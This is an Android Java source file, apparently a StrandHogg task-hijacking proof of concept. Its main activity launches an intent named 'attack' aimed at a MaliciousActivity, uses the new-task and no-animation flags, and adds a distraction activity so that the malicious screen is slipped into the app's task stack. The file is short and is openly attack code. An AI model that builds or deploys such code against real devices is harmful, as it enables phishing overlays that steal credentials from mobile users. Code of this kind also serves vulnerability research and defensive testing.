package com.strandhogg.v1;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent attack = new Intent(this, MaliciousActivity.class);
        attack.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        attack.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);


        Intent distraction = new Intent(this, DistractionActivity.class);
        distraction.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        Intent[] array = new Intent[]{attack, distraction};
        startActivities(array);
    }
}